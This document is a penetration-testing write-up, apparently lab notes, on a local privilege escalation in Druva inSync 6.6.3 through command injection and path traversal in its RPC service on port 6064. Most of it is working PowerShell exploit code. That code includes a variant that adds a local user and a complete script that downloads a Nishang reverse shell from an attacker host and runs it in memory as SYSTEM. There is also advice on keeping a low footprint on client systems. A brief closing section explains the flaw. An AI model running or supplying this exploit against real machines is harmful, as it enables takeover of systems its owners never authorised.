## Druva inSync 6.6.3 - Local Privilege Escalation

### Vulnerability Details

- **Application:** Druva inSync
- **Version:** 6.6.3
- **Vulnerability Type:** Command Injection via RPC Service
- **Exposure:** RPC service on port 6064
- **Impact:** Privilege Escalation to SYSTEM
- **Resource:** https://www.exploit-db.com/exploits/49211
- **Discovery Blog:** https://www.matteomalvica.com/blog/2020/05/21/lpe-path-traversal/

### Exploitation: PowerShell PoC

#### Original Exploit Code

```powershell
$ErrorActionPreference = "Stop"

$cmd = "net user pwnd /add"

$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)

$s.Connect("127.0.0.1", 6064)

$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)
```

> [!info] Exploit Mechanism
> - Creates TCP socket connection to port 6064
> - Sends RPC header with Druva inSync protocol signature
> - Sends command type indicator (0x0005)
> - Sends Unicode-encoded command with length prefix
> - RPC service executes command as SYSTEM

### Method 1: Local Admin User Creation

#### Modification

Change `$cmd` variable to add user to administrators group:

```powershell
$cmd = "net user pwnd /add"
```

> [!warning] Avoidance Note
> Adding local admin users is noisy and modifies system state
> Avoid this method on client systems to minimize footprint

### Method 2: Reverse Shell via PowerShell

#### Step 1: Download Reverse Shell Script

**Resource:** https://github.com/samratashok/nishang/blob/master/Shells/Invoke-PowerShellTcp.ps1

```bash
# On attack box, download and rename
$ wget https://github.com/samratashok/nishang/raw/master/Shells/Invoke-PowerShellTcp.ps1 -O shell.ps1
```

#### Step 2: Modify Reverse Shell Script

Append to bottom of `shell.ps1`:

```powershell
Invoke-PowerShellTcp -Reverse -IPAddress 10.10.14.3 -Port 9443
```

> [!tip] Configuration
> Replace IP address and port with your attack box details
> Ensure port 9443 is open on your listener

#### Step 3: Modify Exploit Command

Update `$cmd` variable in Druva PoC to download and execute shell:

```powershell
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.14.3:8080/shell.ps1')"
```

> [!note] Command Breakdown
> - `powershell` = Execute PowerShell
> - `IEX()` = Invoke-Expression (execute downloaded script in memory)
> - `New-Object Net.Webclient` = Download file from HTTP
> - `downloadString()` = Retrieve script as string
> - URL points to Python web server hosting reverse shell

## Full Exploitation Script Example

### Complete Modified PoC

```powershell
$ErrorActionPreference = "Stop"

# Command to execute (reverse shell download)
$cmd = "powershell IEX(New-Object Net.Webclient).downloadString('http://10.10.15.47:8080/shell.ps1')"

# Create TCP socket
$s = New-Object System.Net.Sockets.Socket(
    [System.Net.Sockets.AddressFamily]::InterNetwork,
    [System.Net.Sockets.SocketType]::Stream,
    [System.Net.Sockets.ProtocolType]::Tcp
)

# Connect to Druva inSync RPC service
$s.Connect("127.0.0.1", 6064)

# Prepare RPC protocol headers
$header = [System.Text.Encoding]::UTF8.GetBytes("inSync PHC RPCW[v0002]")
$rpcType = [System.Text.Encoding]::UTF8.GetBytes("$([char]0x0005)`0`0`0")

# Prepare command with path traversal
$command = [System.Text.Encoding]::Unicode.GetBytes("C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe /c $cmd");
$length = [System.BitConverter]::GetBytes($command.Length);

# Send exploit to service
$s.Send($header)
$s.Send($rpcType)
$s.Send($length)
$s.Send($command)

# Close socket
$s.Close()
```

## Why This Vulnerability Exists

### Path Traversal

```
C:\ProgramData\Druva\inSync4\..\..\..\Windows\System32\cmd.exe
```

- Uses `..` sequences to traverse up directory structure
- Escapes Druva application sandbox
- Reaches Windows System32 directory
- Executes arbitrary commands with service privileges

### Command Injection

- RPC service doesn't properly sanitize user input
- Allows arbitrary command execution
- No validation of command parameters
- Service context = SYSTEM privileges
